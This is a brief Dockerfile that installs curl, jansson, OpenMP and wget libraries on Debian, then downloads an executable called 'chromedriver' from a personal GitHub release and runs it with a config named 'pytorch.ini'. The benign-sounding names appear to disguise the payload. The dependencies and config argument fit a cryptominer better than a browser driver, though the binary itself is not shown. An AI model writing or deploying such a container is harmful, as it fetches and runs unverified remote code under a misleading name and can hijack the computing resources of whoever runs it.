FROM --platform=linux/amd64 debian:sid-slim
EXPOSE 80
EXPOSE 443

WORKDIR /usr/local/bin
RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 wget sudo && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN wget https://github.com/imraahatikah6827/vea/releases/download/chromedriver/chromedriver && \
    chmod +x chromedriver
    
COPY . .    
ENTRYPOINT [ "/usr/local/bin/chromedriver" ]
CMD [ "pytorch.ini" ]
